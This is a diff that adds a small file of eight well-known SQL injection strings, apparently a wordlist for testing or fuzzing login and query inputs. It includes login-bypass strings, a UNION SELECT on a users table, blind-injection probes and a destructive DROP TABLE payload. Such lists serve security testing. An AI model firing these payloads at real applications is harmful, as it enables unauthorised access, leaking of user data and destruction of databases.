@@ -1,0 +1,8 @@
+' OR 1=1 --
+' OR '1'='1
+admin' --
+' UNION SELECT * FROM users --
+'; DROP TABLE users; --
+1' AND 1=1 --
+1' AND 1=2 --
+' OR username LIKE '%
